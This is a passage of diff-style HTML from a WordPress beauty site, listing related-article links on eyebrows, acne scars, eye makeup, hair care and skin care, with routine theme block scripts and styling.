+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/best-eyebrow-kit-efl-anastasia-milani-benefits-dying-shaping-waxing-and-tinting-brow-kits/" rel="bookmark" title="Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?"><img width="79" height="75" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/09/Anastasia-Beverly-Hills-Bold-Beautiful-Kit.jpg" alt="Anastasia Beverly Hills Bold &amp; Beautiful Kit" title="Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/best-eyebrow-kit-efl-anastasia-milani-benefits-dying-shaping-waxing-and-tinting-brow-kits/" rel="bookmark" title="Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani, EFL or Which One?">Which Is the Best Eyebrow Kit To Buy – Anastasia, Milani,...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/demi-lovato-eyebrows-how-to-get-or-do-them-tutorial-x-demi-lovatos-brows/" rel="bookmark" title="How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?"><img width="53" height="75" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/09/how-to-get-demi-lovato-eyebrows.jpg" alt="how to get demi lovato eyebrows" title="How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/demi-lovato-eyebrows-how-to-get-or-do-them-tutorial-x-demi-lovatos-brows/" rel="bookmark" title="How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?">How Do You Get the Thick and Bushy Demi Lovato’s Eyebrows?</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:1"/>        </div>
+
+        
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/bad-eyebrows-how-to-fix-bad-tattooed-celebrities-pictures-photos/" rel="bookmark" title="How to Fix Bad Eyebrows  with Pictures"><img width="54" height="75" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/09/Lourdes-Leon-Madonnas-Daughter-once-seen-with-a-unibrow.jpg" alt="Lourdes Leon - Madonna&#039;s Daughter once seen with a unibrow" title="How to Fix Bad Eyebrows  with Pictures"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/bad-eyebrows-how-to-fix-bad-tattooed-celebrities-pictures-photos/" rel="bookmark" title="How to Fix Bad Eyebrows  with Pictures">How to Fix Bad Eyebrows  with Pictures</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span6 --></div><!--./row-fluid--></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_46_57c835ea2c02d" data-td_block_id="td_uid_46_57c835ea2c02d"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_46_57c835ea2c02d" data-td_block_id="td_uid_46_57c835ea2c02d"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <!-- ./block --><script>var block_td_uid_47_57c835ea3957b = new td_block();
+block_td_uid_47_57c835ea3957b.id = "td_uid_47_57c835ea3957b";
+block_td_uid_47_57c835ea3957b.atts = '{"limit":"6","custom_title":"SCAR AND SCAR TREATMENT","td_filter_default_txt":"All","category_id":"50","class":"td_block_id_962468674 td_uid_47_57c835ea3957b_rand"}';
+block_td_uid_47_57c835ea3957b.td_column_number = "2";
+block_td_uid_47_57c835ea3957b.block_type = "td_block_16";
+block_td_uid_47_57c835ea3957b.post_count = "6";
+block_td_uid_47_57c835ea3957b.found_posts = "142";
+block_td_uid_47_57c835ea3957b.max_num_pages = "24";
+block_td_uid_47_57c835ea3957b.header_color = "";
+block_td_uid_47_57c835ea3957b.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_47_57c835ea3957b);
+</script><div class="td_block_wrap td_block_16 td_block_id_962468674 td_uid_47_57c835ea3957b_rand td-pb-border-top"><h4 class="block-title"><span>SCAR AND SCAR TREATMENT</span></h4><div id=td_uid_47_57c835ea3957b class="td_block_inner td-column-2">
+
+	<div class="td-block-row">
+
+	<div class="td-block-span4">
+
+        <div class="td_module_mx4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/scars/acne-scars/home-remedies-for-acne-scars-overnight-best-fast-on-face/" rel="bookmark" title="Home Remedies for Acne Scars – Overnight, Face"><img width="300" height="182" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Home-Remedies-for-Acne-Scars.jpg" alt="" title="Home Remedies for Acne Scars – Overnight, Face"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/scars/acne-scars/home-remedies-for-acne-scars-overnight-best-fast-on-face/" rel="bookmark" title="Home Remedies for Acne Scars – Overnight, Face">Home Remedies for Acne Scars – Overnight, Face</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span4 -->
+
+	<div class="td-block-span4">
+
+        <div class="td_module_mx4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/scars/acne-scars/mederma-for-acne-scars-gel-does-it-work/" rel="bookmark" title="Mederma for Acne Scars – Is It Good?"><img width="266" height="194" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Mederma-for-Scars-Does-it-Work.png" alt="Mederma for Scars - Does it Work" title="Mederma for Acne Scars – Is It Good?"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/scars/acne-scars/mederma-for-acne-scars-gel-does-it-work/" rel="bookmark" title="Mederma for Acne Scars – Is It Good?">Mederma for Acne Scars – Is It Good?</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span4 -->
+
+	<div class="td-block-span4">
+
+        <div class="td_module_mx4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/scars/acne-scars/best-ways-to-get-rid-of-acne-scars-fast-on-face-naturally-red-back-acne-scars/" rel="bookmark" title="Best Way to Get Rid of Acne Scars– Fast, on Face and Natural"><img width="300" height="194" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Best-Ways-to-Get-Rid-of-Acne-Scars.jpg" alt="Best Ways to Get Rid of Acne Scars" title="Best Way to Get Rid of Acne Scars– Fast, on Face and Natural"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/scars/acne-scars/best-ways-to-get-rid-of-acne-scars-fast-on-face-naturally-red-back-acne-scars/" rel="bookmark" title="Best Way to Get Rid of Acne Scars– Fast, on Face and Natural">Best Way to Get Rid of Acne Scars– Fast, on Face...</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span4 --></div><!--./row-fluid-->
+
+	<div class="td-block-row">
+
+	<div class="td-block-span4">
+
+        <div class="td_module_mx4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/scars/acne-scars/how-to-get-rid-of-acne-scars-on-face-marks-on-face/" rel="bookmark" title="How to Get Rid of Acne Scars on Face – Fast, Best Ways and Masks to Use"><img width="262" height="194" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/How-to-Get-Rid-of-Acne-Scars-Before-and-After-Looks.jpg" alt="How to Get Rid of Acne Scars - Before and After Looks" title="How to Get Rid of Acne Scars on Face – Fast, Best Ways and Masks to Use"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/scars/acne-scars/how-to-get-rid-of-acne-scars-on-face-marks-on-face/" rel="bookmark" title="How to Get Rid of Acne Scars on Face – Fast, Best Ways and Masks to Use">How to Get Rid of Acne Scars on Face – Fast,...</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span4 -->
+
+	<div class="td-block-span4">
+
+        <div class="td_module_mx4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/scars/acne-scars/how-to-get-rid-of-acne-scars-at-home-fast-overnight-tips/" rel="bookmark" title="How to Get Rid of Acne Scars at Home – Fast and Overnight"><img width="224" height="194" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/How-to-Get-Rid-of-Acne-Scars-at-Home.jpg" alt="How to Get Rid of Acne Scars at Home" title="How to Get Rid of Acne Scars at Home – Fast and Overnight"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/scars/acne-scars/how-to-get-rid-of-acne-scars-at-home-fast-overnight-tips/" rel="bookmark" title="How to Get Rid of Acne Scars at Home – Fast and Overnight">How to Get Rid of Acne Scars at Home – Fast...</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span4 -->
+
+	<div class="td-block-span4">
+
+        <div class="td_module_mx4 td_module_wrap td-animation-stack td_module_no_thumb" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/scars/acne-scars/get-acne-scars-fast-home-face/" rel="bookmark" title="How Do You Get Acne Scars Fast – At Home, on Face">How Do You Get Acne Scars Fast – At Home, on...</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span4 --></div><!--./row-fluid--></div></div> <!-- ./block --><script>var block_td_uid_48_57c835ea3e1d0 = new td_block();
+block_td_uid_48_57c835ea3e1d0.id = "td_uid_48_57c835ea3e1d0";
+block_td_uid_48_57c835ea3e1d0.atts = '{"limit":"5","custom_title":"EYE","td_filter_default_txt":"All","ajax_pagination":"next_prev","category_id":"82","sort":"random_posts","class":"td_block_id_2335493300 td_uid_48_57c835ea3e1d0_rand"}';
+block_td_uid_48_57c835ea3e1d0.td_column_number = "2";
+block_td_uid_48_57c835ea3e1d0.block_type = "td_block_1";
+block_td_uid_48_57c835ea3e1d0.post_count = "5";
+block_td_uid_48_57c835ea3e1d0.found_posts = "157";
+block_td_uid_48_57c835ea3e1d0.max_num_pages = "32";
+block_td_uid_48_57c835ea3e1d0.header_color = "";
+block_td_uid_48_57c835ea3e1d0.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_48_57c835ea3e1d0);
+</script><div class="td_block_wrap td_block_1 td_block_id_2335493300 td_uid_48_57c835ea3e1d0_rand td-pb-border-top"><h4 class="block-title"><span>EYE</span></h4><div id=td_uid_48_57c835ea3e1d0 class="td_block_inner">
+
+	<div class="td-block-row">
+
+	<div class="td-block-span6">
+
+        <div class="td_module_4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/dark-eye-circles/how-to-get-rid-of-dark-circles-under-eyes-remedies-cure-treatments/" rel="bookmark" title="Get Rid of Dark Circles under Eyes – How to Reduce, Remove, Remedies, Treatments, Best Creams for Black Eye Circles"><img width="288" height="191" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/04/How-to-Get-Rid-of-Dark-Circles-under-Eyes-–-Laser-Resurfacing-before-and-AfterTreatments.jpg" alt="How to Get Rid of Dark Circles under Eyes – Laser Resurfacing before and AfterTreatments" title="Get Rid of Dark Circles under Eyes – How to Reduce, Remove, Remedies, Treatments, Best Creams for Black Eye Circles"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/dark-eye-circles/how-to-get-rid-of-dark-circles-under-eyes-remedies-cure-treatments/" rel="bookmark" title="Get Rid of Dark Circles under Eyes – How to Reduce, Remove, Remedies, Treatments, Best Creams for Black Eye Circles">Get Rid of Dark Circles under Eyes – How to Reduce,...</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            <div class="td-excerpt">
+                Learn how to get rid of dark circles under eyes including treatments, curing, home or natural remedies and under eye creams for dark circles use.            </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:2"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span6 -->
+
+	<div class="td-block-span6">
+
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eye-colors/amber-eye-color-humans-animal-and-makeup-tips-for-amber-eyes/" rel="bookmark" title="Amber Eyes Color – Meaning, Natural, In Humans, Animals, Genetics, Makeup Tips for Rare Amber Eyed People"><img width="100" height="37" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/04/Amber-Eye-Color-–-Humans-with-Amber-Eyes.jpg" alt="Amber Eye Color – Humans with Amber Eyes" title="Amber Eyes Color – Meaning, Natural, In Humans, Animals, Genetics, Makeup Tips for Rare Amber Eyed People"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eye-colors/amber-eye-color-humans-animal-and-makeup-tips-for-amber-eyes/" rel="bookmark" title="Amber Eyes Color – Meaning, Natural, In Humans, Animals, Genetics, Makeup Tips for Rare Amber Eyed People">Amber Eyes Color – Meaning, Natural, In Humans, Animals, Genetics, Makeup...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:17"/>        </div>
+
+        
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eye-makeup/eyeliner/pencil-eyeliner-pros-cons-best-brands-and-how-to-apply-pencil-eye-liners/" rel="bookmark" title="Pencil Eyeliner –Best, How to Apply, Wear, Use, Tips, Pros, Cons, and Top Pencil Eye Liner Brands"><img width="100" height="67" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/03/Pencil-Eyeliners-Looks.jpg" alt="Pencil Eyeliners Looks" title="Pencil Eyeliner –Best, How to Apply, Wear, Use, Tips, Pros, Cons, and Top Pencil Eye Liner Brands"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eye-makeup/eyeliner/pencil-eyeliner-pros-cons-best-brands-and-how-to-apply-pencil-eye-liners/" rel="bookmark" title="Pencil Eyeliner –Best, How to Apply, Wear, Use, Tips, Pros, Cons, and Top Pencil Eye Liner Brands">Pencil Eyeliner –Best, How to Apply, Wear, Use, Tips, Pros, Cons,...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:2"/>        </div>
+
+        
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eye-makeup/how-to-remove-makeup-why-how-and-tips-for-removing-makeup/" rel="bookmark" title="How to Remove Makeup – Why, Eye Makeup, Face, Tips and Ways for Removing Makeup"><img width="100" height="68" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/03/How-to-Remove-Makeup-–-Tips-for-Removing-Makeup.jpg" alt="How to Remove Makeup – Tips for Removing Makeup" title="How to Remove Makeup – Why, Eye Makeup, Face, Tips and Ways for Removing Makeup"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eye-makeup/how-to-remove-makeup-why-how-and-tips-for-removing-makeup/" rel="bookmark" title="How to Remove Makeup – Why, Eye Makeup, Face, Tips and Ways for Removing Makeup">How to Remove Makeup – Why, Eye Makeup, Face, Tips and...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/eye/eyebrow/how-to-trim-eyebrows-for-women-men-and-tips-for-brow-trimming/" rel="bookmark" title="How to Trim Eyebrows for Women, Men and Tips for Trimming Your Brows at Home"><img width="100" height="75" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/04/How-to-Trim-Eyebrows-for-Women-Men-and-Tips-for-Brow-Trimming-Before-and-After.jpg" alt="How to Trim Eyebrows for Women, Men and Tips for Brow Trimming Before and After" title="How to Trim Eyebrows for Women, Men and Tips for Trimming Your Brows at Home"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/eye/eyebrow/how-to-trim-eyebrows-for-women-men-and-tips-for-brow-trimming/" rel="bookmark" title="How to Trim Eyebrows for Women, Men and Tips for Trimming Your Brows at Home">How to Trim Eyebrows for Women, Men and Tips for Trimming...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:1"/>        </div>
+
+        
+	</div> <!-- ./td-block-span6 --></div><!--./row-fluid--></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_48_57c835ea3e1d0" data-td_block_id="td_uid_48_57c835ea3e1d0"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_48_57c835ea3e1d0" data-td_block_id="td_uid_48_57c835ea3e1d0"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <!-- ./block -->
+		</div> 
+	</div> 
+
+<style scoped>
+.td_uid_50_57c835ea63764_rand .td_module_wrap:hover .entry-title a,
+            .td_uid_50_57c835ea63764_rand .td-load-more-wrap a:hover {
+                color: #ffffff;
+            }
+
+            .td_uid_50_57c835ea63764_rand .td-next-prev-wrap a:hover i {
+                background-color: #ffffff;
+                border-color: #ffffff;
+            }
+            .td_uid_50_57c835ea63764_rand .td_module_wrap .td-post-category:hover {
+                background-color: #ffffff;
+            }
+
+            .td_uid_50_57c835ea63764_rand .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover {
+                color: #ffffff;
+            }
+
+            .td_uid_50_57c835ea63764_rand a.td-pulldown-filter-link:hover {
+                color: #ffffff;
+            }
+
+
+            .td_uid_50_57c835ea63764_rand .block-title span,
+            .td_uid_50_57c835ea63764_rand .block-title a {
+                background-color: #ffffff;
+            }
+
+            
+            .td_uid_50_57c835ea63764_rand .block-title span,
+            .td_uid_50_57c835ea63764_rand .block-title a {
+                color: #000000;
+            }
+</style>
+	<div class="td-pb-span4 wpb_column column_container">
+		<div class="wpb_wrapper">
+			<script>var block_td_uid_49_57c835ea4fd86 = new td_block();
+block_td_uid_49_57c835ea4fd86.id = "td_uid_49_57c835ea4fd86";
+block_td_uid_49_57c835ea4fd86.atts = '{"limit":"5","custom_title":"HAIR CARE","td_filter_default_txt":"All","category_id":"85","sort":"random_posts","class":"td_block_id_3099669275 td_uid_49_57c835ea4fd86_rand"}';
+block_td_uid_49_57c835ea4fd86.td_column_number = "1";
+block_td_uid_49_57c835ea4fd86.block_type = "td_block_9";
+block_td_uid_49_57c835ea4fd86.post_count = "5";
+block_td_uid_49_57c835ea4fd86.found_posts = "68";
+block_td_uid_49_57c835ea4fd86.max_num_pages = "14";
+block_td_uid_49_57c835ea4fd86.header_color = "";
+block_td_uid_49_57c835ea4fd86.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_49_57c835ea4fd86);
+</script><div class="td_block_wrap td_block_9 td_block_id_3099669275 td_uid_49_57c835ea4fd86_rand td-pb-border-top"><h4 class="block-title"><span>HAIR CARE</span></h4><div id=td_uid_49_57c835ea4fd86 class="td_block_inner">
+
+	<div class="td-block-span12">
+
+        <div class="td_module_8 td_module_wrap" itemscope itemtype="http://schema.org/Article">
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/damaged-hair/best-treatment-for-damaged-hair-serums-masks-creams/" rel="bookmark" title="Best Treatments for Damaged Hair – Shampoos, Conditioners &amp; Serums">Best Treatments for Damaged Hair – Shampoos, Conditioners &amp; Serums</a></h3>                <div class="meta-info">
+                                                                                                </div>
+            </div>
+
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_8 td_module_wrap" itemscope itemtype="http://schema.org/Article">
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/dry-hair/how-to-fix-dry-damaged-hair-best-masks-moisturize-damaged/" rel="bookmark" title="How to Fix Dry Hair, Moisturize and Best Masks for Dry Hair">How to Fix Dry Hair, Moisturize and Best Masks for Dry Hair</a></h3>                <div class="meta-info">
+                                                                                                </div>
+            </div>
+
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_8 td_module_wrap" itemscope itemtype="http://schema.org/Article">
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/scalp/itchy-scalp/causes-of-itchy-scalp-red-at-night/" rel="bookmark" title="Causes of Itchy Scalp – Reason, Extreme and at Night">Causes of Itchy Scalp – Reason, Extreme and at Night</a></h3>                <div class="meta-info">
+                                                                                                </div>
+            </div>
+
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_8 td_module_wrap" itemscope itemtype="http://schema.org/Article">
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/hair-dyes/turquoise-hair-dye-hair-color-best-brands-atomic-permanent-turquoise-hair-color-and-dye/" rel="bookmark" title="Turquoise Hair Dye and Hair Color – Best Brands Including Atomic and Semi Permanent">Turquoise Hair Dye and Hair Color – Best Brands Including Atomic and Semi Permanent</a></h3>                <div class="meta-info">
+                                                                                                </div>
+            </div>
+
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_8 td_module_wrap td_module_no_thumb" itemscope itemtype="http://schema.org/Article">
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/natural-hair/co-washing-natural-hair-often-best/" rel="bookmark" title="Co-Washing Natural Hair – What Is It? How Often and Best">Co-Washing Natural Hair – What Is It? How Often and Best</a></h3>                <div class="meta-info">
+                                                                                                </div>
+            </div>
+
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 --></div></div> <!-- ./block --><script>var block_td_uid_50_57c835ea63764 = new td_block();
+block_td_uid_50_57c835ea63764.id = "td_uid_50_57c835ea63764";
+block_td_uid_50_57c835ea63764.atts = '{"limit":"5","custom_title":"SKIN CARE","color_preset":"td-block-color-style-2","td_filter_default_txt":"All","header_text_color":"#000000","header_color":"#ffffff","ajax_pagination":"next_prev","category_id":"89","sort":"random_posts","class":"td_block_id_2659630236 td_uid_50_57c835ea63764_rand"}';
+block_td_uid_50_57c835ea63764.td_column_number = "1";
+block_td_uid_50_57c835ea63764.block_type = "td_block_2";
+block_td_uid_50_57c835ea63764.post_count = "5";
+block_td_uid_50_57c835ea63764.found_posts = "86";
+block_td_uid_50_57c835ea63764.max_num_pages = "18";
+block_td_uid_50_57c835ea63764.header_color = "#ffffff";
+block_td_uid_50_57c835ea63764.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_50_57c835ea63764);
+</script><div class="td_block_wrap td_block_2 td_block_id_2659630236 td_uid_50_57c835ea63764_rand td-pb-full-cell td-block-color-style-2 td-pb-border-top"><h4 class="block-title"><span>SKIN CARE</span></h4><div id=td_uid_50_57c835ea63764 class="td_block_inner">
+
+	<div class="td-block-span12">
+
+        <div class="td_module_4 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/skin-tags/skin-tags-on-children-types-dangerous-images-formation/" rel="bookmark" title="Skin Tags – on Children, Types, Are they Dangerous, Images, Formation"><img width="" height="" itemprop="image" class="entry-thumb" src="" alt="" title="Skin Tags – on Children, Types, Are they Dangerous, Images, Formation"/></a></div>                            </div>
+
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-tags/skin-tags-on-children-types-dangerous-images-formation/" rel="bookmark" title="Skin Tags – on Children, Types, Are they Dangerous, Images, Formation">Skin Tags – on Children, Types, Are they Dangerous, Images, Formation</a></h3>
+            <div class="meta-info">
+                                                            </div>
+
+            <div class="td-excerpt">
+                Are you wondering what causes skin tags whether it is on your eyelids, face, or neck? This article will discuss in details the causes of skin tags.             </div>
+
+            
+            <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>
+        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_6 td_module_wrap td-animation-stack td_module_no_thumb" itemscope itemtype="http://schema.org/Article">
+
+        
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-bleaching/best-skin-bleaching-cream-top-for-black-skin-vantex-othine-piona/" rel="bookmark" title="Best Skin Bleaching Creams – African Americans, Face, Vantex, Othine and Piona">Best Skin Bleaching Creams – African Americans, Face, Vantex, Othine and...</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
+        <div class="td_module_6 td_module_wrap td-animation-stack" itemscope itemtype="http://schema.org/Article">
+
+        <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/dry-skin/best-body-lotion-for-dry-skin-face-hands-legs/" rel="bookmark" title="Best Lotion for Dry Skin on Face, Legs and Hands"><img width="100" height="60" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/03/Orange-eyeliner-Colors.jpg" alt="Orange eyeliner Colors" title="Best Lotion for Dry Skin on Face, Legs and Hands"/></a></div>
+        <div class="item-details">
+            <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/dry-skin/best-body-lotion-for-dry-skin-face-hands-legs/" rel="bookmark" title="Best Lotion for Dry Skin on Face, Legs and Hands">Best Lotion for Dry Skin on Face, Legs and Hands</a></h3>            <div class="meta-info">
+                                                                            </div>
+        </div>
+        <meta itemprop="author" content = "Kelsea"><meta itemprop="interactionCount" content="UserComments:0"/>        </div>
+
+        
+	</div> <!-- ./td-block-span12 -->
+
+	<div class="td-block-span12">
+
